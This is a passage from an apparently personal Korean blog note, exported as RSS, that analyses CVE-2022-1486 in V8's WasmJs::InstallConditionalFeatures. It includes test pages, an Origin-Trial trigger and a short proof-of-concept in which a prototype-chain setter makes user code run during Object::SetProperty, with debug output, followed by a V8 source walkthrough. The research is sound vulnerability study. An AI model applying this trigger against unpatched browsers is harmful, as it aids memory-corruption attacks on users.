<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title></title>
    <link>http://localhost:4000</link>
    <description>
      private note
    </description>
    
        
            <item>
                <title>CVE-2022-1486</title>
                <link>http://localhost:4000/2022/05/05/1486/</link>
                <content:encoded>
                    <![CDATA[
                    <h2 id="installconditionalfeatures">InstallConditionalFeatures</h2>

<p>취약점을 트리거하기 위해서는 WasmJs::InstallConditionalFeatures()를 호출할 수 있어야 한다. 해당 함수는 Isolate::InstallConditionalFeatures에서 호출되며 v8 API로 노출되어있다. 즉, V8 임베더에서 호출해야 한다. 우리는 크로미움 프로젝트 소스코드에서 해당 코드가 호출되는 곳을 찾아야 한다.</p>

<p>CVE-2021-30561 때에는 Origin-Trial로 WebAssembly.Exception 기능을 시험할 수 있었고 따라서 Origin-Trial 토큰을 이용하여 문서 도중에 해당 기능을 트리거 할 수 있었다. 현재는 Origin-Trial에서 해당 기능의 목록이 안보이지만… 여전히 관련 코드는 있는 듯 하여 상세한 분석이 필요해 보인다.</p>

<p>현재 Isolate::InstallConditionalFeatures의 모든 레퍼런스 검색을 통해 확인한 바로는 다음과 같이 세 군데에서 해당 함수를 호출한다.</p>

<ol>
  <li>third_party/blink/renderer/core/origin_trials/origin_trial_context.cc, OriginTrialContext::InitializePendingFeatures()</li>
  <li>third_party/blink/renderer/bindings/core/v8/worker_or_worklet_script_controller.cc, WorkerOrWorkletScriptController::PrepareForEvaluation()</li>
  <li>third_party/blink/renderer/bindings/core/v8/local_window_proxy.cc, LocalWindowProxy::InstallConditionalFeatures()</li>
</ol>

<p>크롬 실행 시 디폴트로 WebAssembly.Tag 를 추가해주는 코드 흐름은</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:: LocalWindowProxy::InstallConditionalFeatures() starts!
DEBUG:: Isolate::InstallConditionalFeatures starts!
DEBUG:: WasmJs::InstallConditionalFeatures starts!
</code></pre></div></div>

<p>위와 같이, LocalWindowProxy 인 듯 하다. LocalWindowProxy가 사용자 마음대로 호출할 수 있는 것인가…?</p>

<p>iframe을 가지고 몇 가지 테스트를 해봤는데… LocalWindowProxy를 통해서는 내가 원하는 흐름을 만들 수가 없을 것 같다. iframe을 만들면서 컨텍스트 생성 전에 내가 property를 건드릴 수 있고 이후 컨텍스트가 생성되게 해야하는데 그게 안되는 듯…</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// test.html
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"test1"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;button</span> <span class="na">id=</span><span class="s">"test1button"</span><span class="nt">&gt;</span>test1 button<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello, world!</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Tag</span><span class="p">);</span>
<span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Tag</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Tag</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">test1_div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">test1</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">substack</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">substack</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">./inner_test.html?x=</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">substack</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">substack</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">150</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">substack</span><span class="p">.</span><span class="nx">frameBorder</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">substack</span><span class="p">.</span><span class="nx">scrolling</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">;</span>
<span class="c1">//substack.style.border = "none";</span>
<span class="nx">substack</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">background</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">white</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">substack</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe onload!</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">//alert("iframe onload");</span>
<span class="p">});</span>

<span class="kd">let</span> <span class="nx">inner_window</span> <span class="o">=</span> <span class="nx">substack</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">inner_window</span><span class="p">);</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">test1button</span><span class="dl">"</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">,</span> 
  <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> 
    <span class="nx">test1_div</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">substack</span><span class="p">);</span>
  <span class="p">});</span>

<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// inner_test.html
<span class="nt">&lt;p&gt;</span>Hello! inner!<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;script&gt;</span> 
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">inner!!</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Tag</span><span class="p">);</span>
  <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">inner!!</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>contentWindow는 document를 다 로드한 후 접근 가능(그 전엔 null)함. onload 이벤트는 inner_test.html이 다 실행된 후에 실행됨. DOMContentLoaded 이벤트도 해당사항 없는 듯.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// index.html
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>

<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">meta</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">meta</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">meta</span><span class="p">.</span><span class="nx">httpEquiv</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Origin-Trial</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">meta</span><span class="p">.</span><span class="nx">content</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">AkSaE8O8RomKy1xQaGt3pABGxv+810EPGhku/xeFQ46yM1EL3hghSDcCRDH/udtyPoHAKLz7knImzJ652WVoAAcAAABQeyJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjgwMDgiLCJmZWF0dXJlIjoiQ2FwdHVyZUhhbmRsZSIsImV4cGlyeSI6MTY1ODg3OTk5OX0=</span><span class="dl">'</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">meta</span><span class="p">);</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>

<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>

<p>이걸로 트리거 되는데…? 그냥 origin trial로 되네? -_-</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:: OriginTrialContext::InitializePendingFeatures starts! 0, 0
DEBUG:: OriginTrialContext::InitializePendingFeatures starts! 1, 0
DEBUG:: OriginTrialContext::InitializePendingFeatures 111
DEBUG:: OriginTrialContext::InitializePendingFeatures 222
DEBUG:: OriginTrialContext::InitializePendingFeatures 333
DEBUG:: OriginTrialContext::InitializePendingFeatures 444
DEBUG:: OriginTrialContext::InitializePendingFeatures, added_binding_features: 1
DEBUG:: Isolate::InstallConditionalFeatures starts!
DEBUG:: WasmJs::InstallConditionalFeatures starts!
DEBUG:: WasmJs::InstallConditionalFeatures, has_eh()
</code></pre></div></div>

<p>Origin-Trial token은 다음에서 파싱해볼 수 있다.</p>

<p><a href="https://googlechrome.github.io/OriginTrials/check-token.html">https://googlechrome.github.io/OriginTrials/check-token.html</a></p>

<blockquote>
  <p>Valid? Valid
Version 2
Origin http://localhost:8008
Matches Subdomains? No
Matches Third-party? No
Usage Restriction
Feature CaptureHandle
Expires 7/27/2022, 8:59:59 AM</p>
</blockquote>

<p>이제 d8에서 테스트해보면 되겠다.</p>

<h2 id="patch-analysis--poc">patch analysis &amp; poc</h2>

<ol>
  <li>JSObject::HasOwnProperty로 “Tag”가 존재하는지 확인 –&gt; 패치 전/후 동일</li>
  <li>CreateFunc 으로 tag_constructor 생성 –&gt; 패치 전/후 동일</li>
  <li>Object::SetProperty 로 webassembly에 tag_name으로 tag_constructor를 설정 –&gt; 패치 전에만, 패치 후엔 해당 구문 X</li>
  <li>context-&gt;set_wasm_tag_constructor(*tag_constructor) –&gt; 패치 전/후 동일</li>
  <li>SetupConstructor –&gt; 패치 전/후 동일</li>
  <li>JSObject::DefineOwnPropertyIgnoreAttributes로 프로퍼티 설정 –&gt; 패치 후 추가</li>
</ol>

<p>제일 큰 차이점은 Object::SetProperty 가 JSObject::DefineOwnPropertyIgnoreAttributes 로 변경된 점인 듯 하다. 프로퍼티를 추가하는 위치 또한 변경된 것이 의미가 있어보임.</p>

<blockquote>
  <p>// The {WebAssembly} object may already have been modified. The following
// code is designed to:
//  - check for existing {Tag} properties on the object itself, and avoid
//    overwriting them or adding duplicate properties
//  - disregard any setters or read-only properties on the prototype chain
//  - only make objects accessible to user code after all internal setup
//    has been completed.</p>
</blockquote>

<p>위 주석을 통해 유추컨데, setter가 중요한 포인트 아닐까? SetProperty를 통해 user javascript code가 실행되도록 할 수 있을듯?</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">object_1</span> <span class="o">=</span> <span class="p">{};</span>
<span class="kd">let</span> <span class="nx">object_2</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">object_1</span><span class="p">.</span><span class="nx">__defineSetter__</span><span class="p">(</span><span class="dl">"</span><span class="s2">Tag</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">setter!!</span><span class="dl">"</span><span class="p">);</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">_Tag</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
<span class="p">});</span>
<span class="nx">object_2</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nx">object_1</span><span class="p">;</span>

<span class="nx">WebAssembly</span> <span class="o">=</span> <span class="nx">object_2</span><span class="p">;</span>
<span class="nx">d8</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">installConditionalFeatures</span><span class="p">();</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:: Shell::InstallConditionalFeatures
DEBUG:: WasmJs::InstallConditionalFeatures starts!
DEBUG:: WasmJs::InstallConditionalFeatures has_eh()
DEBUG:: WasmJs::InstallConditionalFeatures, JSObject? 1 ,  JSProxy? 0
setter!!
DEBUG:: WasmJs::InstallConditionalFeatures, finished!

DebugPrint: 0x3fe00004b345: [JS_OBJECT_TYPE]
 - map: 0x3fe000207f31 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x3fe00004b329 &lt;Object map = 0x3fe000207f09&gt;
 - elements: 0x3fe000002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x3fe000002261 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0x3fe0001d3bd9: [String] in OldSpace: #_Tag: 0x3fe0001d3ba5 &lt;JSFunction Tag (sfi = 0x3fe0001d3b81)&gt; (const data field 0), location: in-object
 }
</code></pre></div></div>

<p>WebAssembly에 바로 setter가 있으면 HasOwnProperty로 걸러지고, 위처럼 prototype chain 상에 setter가 존재하도록 하면 setter가 호출됨을 알 수 있음.</p>

<p>setter에서 유저 코드가 실행되는 점을 악용하려면… SetupConstructor를 이용해야 할 것 같아 보인다.</p>

<h3 id="objectsetproperty-가-prototype-chain-상의-setter를-호출하는-과정-분석">Object::SetProperty 가 prototype chain 상의 setter를 호출하는 과정 분석</h3>

<p>WasmJs::InstallConditionalFeatures에서 SetProperty의 호출은 다음과 같다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// wasm-js.cc</span>
<span class="kt">void</span> <span class="n">WasmJs</span><span class="o">::</span><span class="n">InstallConditionalFeatures</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">)</span> <span class="p">{</span>
			<span class="p">...</span>
    <span class="k">auto</span> <span class="n">result</span> <span class="o">=</span>
        <span class="n">Object</span><span class="o">::</span><span class="n">SetProperty</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">webassembly</span><span class="p">,</span> <span class="n">tag_name</span><span class="p">,</span> <span class="n">tag_constructor</span><span class="p">,</span>
                            <span class="n">StoreOrigin</span><span class="o">::</span><span class="n">kNamed</span><span class="p">,</span> <span class="n">Just</span><span class="p">(</span><span class="n">ShouldThrow</span><span class="o">::</span><span class="n">kDontThrow</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">is_null</span><span class="p">())</span> <span class="p">{</span>
      <span class="c1">// Setting the {Tag} constructor failed. We just bail out.</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
			<span class="p">...</span>
			
<span class="c1">// objects.h</span>
  <span class="n">V8_EXPORT_PRIVATE</span> <span class="n">V8_WARN_UNUSED_RESULT</span> <span class="k">static</span> <span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">SetProperty</span><span class="p">(</span>
      <span class="n">LookupIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span> <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">,</span>
      <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span> <span class="o">=</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span><span class="p">());</span>
  <span class="n">V8_EXPORT_PRIVATE</span> <span class="n">V8_WARN_UNUSED_RESULT</span> <span class="k">static</span> <span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span>
  <span class="n">SetProperty</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">object</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span>
              <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
              <span class="n">StoreOrigin</span> <span class="n">store_origin</span> <span class="o">=</span> <span class="n">StoreOrigin</span><span class="o">::</span><span class="n">kMaybeKeyed</span><span class="p">,</span>
              <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span> <span class="o">=</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span><span class="p">());</span>

<span class="c1">// objects.cc</span>
<span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Object</span><span class="o">::</span><span class="n">SetProperty</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">object</span><span class="p">,</span>
                                        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                        <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">,</span>
                                        <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">LookupIterator</span> <span class="n">it</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">object</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
  <span class="n">MAYBE_RETURN_NULL</span><span class="p">(</span><span class="n">SetProperty</span><span class="p">(</span><span class="o">&amp;</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">));</span>
  <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>isolate, object, name, value가 파라메터로 필요한 것은 당연하다 볼 수 있고, 현 시점에서 store_origin, should_throw에 대한 정확한 역할 이해는 미뤄두자. 호출하면 isolate, object, name으로 LookupIterator를 생성하고 이를 통해 SetProperty를 다시 호출하는 wrapper 형태의 함수이다. LookupIterator는 프로퍼티 관련하여 매우 자주 등장하므로 이번 기회에 어느정도 분석을 해 보자.</p>

<p>LookupIterator는 이름에서 알 수 있듯이 객체(receiver)에서 프로퍼티를 name 혹은 index로 찾는 역할을 찾는 이터레이터 기능을 한다. 객체를 생성하자마자 탐색이 진행되는 부분이 있으므로 생성자에 대한 분석이 필요하다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// lookup-inl.h</span>
<span class="n">LookupIterator</span><span class="o">::</span><span class="n">LookupIterator</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="n">Configuration</span> <span class="n">configuration</span><span class="p">)</span>
    <span class="o">:</span> <span class="n">LookupIterator</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">kInvalidIndex</span><span class="p">,</span> <span class="n">receiver</span><span class="p">,</span>
                     <span class="n">configuration</span><span class="p">)</span> <span class="p">{}</span>

<span class="n">LookupIterator</span><span class="o">::</span><span class="n">LookupIterator</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">index</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lookup_start_object</span><span class="p">,</span>
                               <span class="n">Configuration</span> <span class="n">configuration</span><span class="p">)</span>
    <span class="o">:</span> <span class="n">configuration_</span><span class="p">(</span><span class="n">ComputeConfiguration</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">configuration</span><span class="p">,</span> <span class="n">name</span><span class="p">)),</span>
      <span class="n">isolate_</span><span class="p">(</span><span class="n">isolate</span><span class="p">),</span>
      <span class="n">name_</span><span class="p">(</span><span class="n">name</span><span class="p">),</span>
      <span class="n">receiver_</span><span class="p">(</span><span class="n">receiver</span><span class="p">),</span>
      <span class="n">lookup_start_object_</span><span class="p">(</span><span class="n">lookup_start_object</span><span class="p">),</span>
      <span class="n">index_</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">IsElement</span><span class="p">())</span> <span class="p">{</span>
			<span class="p">...</span>
    <span class="n">Start</span><span class="o">&lt;</span><span class="nb">true</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">name_</span><span class="p">.</span><span class="n">is_null</span><span class="p">());</span>
    <span class="n">name_</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">InternalizeName</span><span class="p">(</span><span class="n">name_</span><span class="p">);</span>
<span class="cp">#ifdef DEBUG
</span>			<span class="p">...</span>
<span class="cp">#endif  // DEBUG
</span>    <span class="n">Start</span><span class="o">&lt;</span><span class="nb">false</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>name으로 찾고자 할 경우 index=kInvalidIndex(=0xffffffffffffffff)가 설정된다. IsElement 경우와 DEBUG 내에서 검증 구문은 넘어가자. name일 경우 is_element=false로 Start를 호출한다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="kt">bool</span> <span class="n">is_element</span><span class="p">&gt;</span>
<span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">Start</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// GetRoot might allocate if lookup_start_object_ is a string.</span>
  <span class="n">holder_</span> <span class="o">=</span> <span class="n">GetRoot</span><span class="p">(</span><span class="n">isolate_</span><span class="p">,</span> <span class="n">lookup_start_object_</span><span class="p">,</span> <span class="n">index_</span><span class="p">);</span>

  <span class="p">{</span>
    <span class="n">DisallowGarbageCollection</span> <span class="n">no_gc</span><span class="p">;</span>

    <span class="n">has_property_</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="n">state_</span> <span class="o">=</span> <span class="n">NOT_FOUND</span><span class="p">;</span>

    <span class="n">JSReceiver</span> <span class="n">holder</span> <span class="o">=</span> <span class="o">*</span><span class="n">holder_</span><span class="p">;</span>
    <span class="n">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="n">holder</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">);</span>

    <span class="n">state_</span> <span class="o">=</span> <span class="n">LookupInHolder</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">holder</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">IsFound</span><span class="p">())</span> <span class="k">return</span><span class="p">;</span>

    <span class="n">NextInternal</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">holder</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>GetRoot는 IsJSReceiver 여부를 확인해서 JSReceiver일 경우 Handle<JSReceiver>로 캐스팅하여 리턴한다. (JSReceiver가 아닌 경우에는 여기서는 건너가자.) 즉, JSReceiver일 경우 holder_는 lookup_start_object_ 와 같은 객체를 가리킨다. JSReceiver의 여부는... 조금 복잡하지만, 다음에서 확인할 수 있다.</JSReceiver></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// out.gn/x64.debug/gen/torque-generated/instance-types.h</span>
<span class="cp">#define TORQUE_ASSIGNED_INSTANCE_TYPES(V) \
			...
</span>	<span class="n">V</span><span class="p">(</span><span class="n">FIRST_JS_RECEIVER_TYPE</span><span class="p">,</span> <span class="mi">264</span><span class="p">)</span> \
      <span class="n">V</span><span class="p">(</span><span class="n">FIRST_WASM_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">264</span><span class="p">)</span> \
        <span class="n">V</span><span class="p">(</span><span class="n">WASM_ARRAY_TYPE</span><span class="p">,</span> <span class="mi">264</span><span class="p">)</span> \
        <span class="n">V</span><span class="p">(</span><span class="n">WASM_STRUCT_TYPE</span><span class="p">,</span> <span class="mi">265</span><span class="p">)</span>\
      <span class="n">V</span><span class="p">(</span><span class="n">LAST_WASM_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">265</span><span class="p">)</span> \
      <span class="n">V</span><span class="p">(</span><span class="n">JS_PROXY_TYPE</span><span class="p">,</span> <span class="mi">266</span><span class="p">)</span> \
      <span class="n">V</span><span class="p">(</span><span class="n">FIRST_JS_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">267</span><span class="p">)</span> \
			<span class="p">...</span>
      <span class="n">V</span><span class="p">(</span><span class="n">LAST_JS_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">2145</span><span class="p">)</span> \
    <span class="n">V</span><span class="p">(</span><span class="n">LAST_JS_RECEIVER_TYPE</span><span class="p">,</span> <span class="mi">2145</span><span class="p">)</span> \
			<span class="p">...</span>
			
<span class="cp">#define TORQUE_INSTANCE_CHECKERS_RANGE_FULLY_DEFINED(V) \
			...
</span>  <span class="n">V</span><span class="p">(</span><span class="n">JSReceiver</span><span class="p">,</span> <span class="n">FIRST_JS_RECEIVER_TYPE</span><span class="p">,</span> <span class="n">LAST_JS_RECEIVER_TYPE</span><span class="p">)</span> \
</code></pre></div></div>

<p>FIRST_JS_RECEIVER_TYPE 부터 LAST_JS_RECEIVER_TYPE 까지를 판단하며 JSObject 를 포함하여 대부분의 것들이 JSReceiver에 속한다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>has_property_ = false;
state_ = NOT_FOUND; Start()로 돌아오면, 우선 `has_property_ = false;`, `state_ = NOT_FOUND;` 로 초기화한 후 holder의 map을 구하고 LookupInHolder&lt;is_element&gt;(map, holder)를 호출한다. LookupInHolder는 인라인 함수로 다음과 같다.
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kr">inline</span> <span class="n">State</span> <span class="nf">LookupInHolder</span><span class="p">(</span><span class="n">Map</span> <span class="n">map</span><span class="p">,</span> <span class="n">JSReceiver</span> <span class="n">holder</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">map</span><span class="p">.</span><span class="n">IsSpecialReceiverMap</span><span class="p">()</span>
               <span class="o">?</span> <span class="n">LookupInSpecialHolder</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">holder</span><span class="p">)</span>
               <span class="o">:</span> <span class="n">LookupInRegularHolder</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">holder</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>IsSpecialReceiverMap()은 LAST_JS_SPECIAL_OBJECT_TYPE 과 비교함으로써 검사하며 다음과 같이 네 가지의 유형이 있다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// oug.gn/x64.debug/gen/torque-generated/instance-types.h</span>
          <span class="n">V</span><span class="p">(</span><span class="n">FIRST_JS_SPECIAL_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">267</span><span class="p">)</span> \
